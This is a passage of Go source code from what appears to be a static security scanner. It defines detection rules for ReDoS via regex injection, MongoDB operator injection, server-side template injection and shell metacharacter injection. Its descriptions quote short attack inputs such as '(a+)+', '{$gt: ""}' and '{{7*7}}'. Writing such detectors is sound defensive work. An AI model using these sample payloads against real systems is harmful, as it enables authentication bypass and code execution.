func (r *RegExpInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		if loc := reRegexNew.FindStringIndex(line); loc != nil {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:       "RegExp injection: user input in regex compilation",
				Description: "User-controlled input passed to regex compilation allows ReDoS attacks via catastrophic backtracking patterns (e.g., (a+)+ or (a|a)+). A single request can consume 100% CPU for minutes.",
				FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
				Suggestion:    "Escape user input with regex escape functions (re.escape in Python, regexp.QuoteMeta in Go, RegExp.escape in JS). Set regex timeout limits. Consider using literal string matching instead.",
				CWEID:         "CWE-1333",
				OWASPCategory: "A03:2021-Injection",
				Language:      ctx.Language, Confidence: "high",
				Tags: []string{"injection", "regex", "redos"},
			})
		} else if loc := reRegexVar.FindStringIndex(line); loc != nil {
			// Lower confidence: variable in regex could be user input
			if reRegexUserCtx.MatchString(nearbyLinesExt(lines, i, 10)) {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "RegExp injection: variable in regex compilation (verify source)",
					Description: "A variable is passed to regex compilation and user input exists nearby. If the variable contains user input, this enables ReDoS attacks.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Verify the variable is not user-controlled. If it is, escape with regex escape functions or use literal string matching.",
					CWEID:         "CWE-1333",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "medium",
					Tags: []string{"injection", "regex", "redos"},
				})
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-022: MongoDB operator injection
// ---------------------------------------------------------------------------

type MongoOperatorInjection struct{}

func (r *MongoOperatorInjection) ID() string                     { return "BATOU-INJ-022" }
func (r *MongoOperatorInjection) Name() string                   { return "MongoOperatorInjection" }
func (r *MongoOperatorInjection) DefaultSeverity() rules.Severity { return rules.High }
func (r *MongoOperatorInjection) Description() string {
	return "Detects MongoDB queries where request body/params are passed directly, allowing injection of query operators ($gt, $ne, $regex) to bypass authentication or exfiltrate data."
}
func (r *MongoOperatorInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangJavaScript, rules.LangTypeScript, rules.LangPython}
}

func (r *MongoOperatorInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	// Skip if sanitization is present
	if reMongoNoSanitize.MatchString(ctx.Content) {
		return nil
	}
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		if loc := reMongoReqDirect.FindStringIndex(line); loc != nil {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:       "MongoDB operator injection: request data passed directly to query",
				Description: "Request body/query/params passed directly to MongoDB query methods allows injection of operators like {$gt: \"\"} to bypass authentication or {$regex: \"\"} for data exfiltration.",
				FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
				Suggestion:    "Use express-mongo-sanitize middleware to strip $ operators. Validate and cast input to expected types. Use schema validation.",
				CWEID:         "CWE-943",
				OWASPCategory: "A03:2021-Injection",
				Language:      ctx.Language, Confidence: "high",
				Tags: []string{"injection", "nosql", "mongodb", "operator"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-023: SSTI via string concatenation
// ---------------------------------------------------------------------------

type SSTIConcat struct{}

func (r *SSTIConcat) ID() string                     { return "BATOU-INJ-023" }
func (r *SSTIConcat) Name() string                   { return "SSTIConcat" }
func (r *SSTIConcat) DefaultSeverity() rules.Severity { return rules.High }
func (r *SSTIConcat) Description() string {
	return "Detects user input concatenated into template strings before rendering, enabling Server-Side Template Injection (SSTI) for remote code execution."
}
func (r *SSTIConcat) Languages() []rules.Language {
	return []rules.Language{rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangRuby}
}

func (r *SSTIConcat) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reSSTIConcat, reSSTIFString, reSSTIEngine}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "SSTI: user input concatenated into template",
					Description: "User input concatenated into template source code before rendering allows Server-Side Template Injection. An attacker can inject template syntax (e.g., {{7*7}}, ${7*7}) to execute arbitrary code on the server.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Never concatenate user input into template strings. Pass user data as template variables/context instead. Use render_template(file, data=value) not render_template_string(user_input).",
					CWEID:         "CWE-1336",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "ssti", "template", "rce"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-024: Shell metacharacter injection
// ---------------------------------------------------------------------------

type ShellMetacharInjection struct{}

func (r *ShellMetacharInjection) ID() string                     { return "BATOU-INJ-024" }
func (r *ShellMetacharInjection) Name() string                   { return "ShellMetacharInjection" }
func (r *ShellMetacharInjection) DefaultSeverity() rules.Severity { return rules.High }
func (r *ShellMetacharInjection) Description() string {
	return "Detects shell command execution with metacharacters (|, ;, &&, ||, $()) combined with user input, enabling command chaining and arbitrary command execution."
}
func (r *ShellMetacharInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangRuby, rules.LangGo, rules.LangShell}
}

func (r *ShellMetacharInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reShellMeta, reShellPipe, reShellBacktick}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "Shell metacharacter injection with user input",
					Description: "Shell command execution contains metacharacters (|, ;, &&, ||, $()) combined with user input. An attacker can chain arbitrary commands using these metacharacters.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Use parameterized command execution (e.g., subprocess.run with list args, exec.Command with separate args). Never pass user input through a shell interpreter.",
					CWEID:         "CWE-78",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "command", "shell", "metacharacter"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// Helpers local to this file
// ---------------------------------------------------------------------------

func nearbyLinesExt(lines []string, idx, window int) string {
	start := idx - window
	if start < 0 {
		start = 0
	}
	end := idx + window + 1
	if end > len(lines) {
		end = len(lines)
	}
	return strings.Join(lines[start:end], "\n")
}
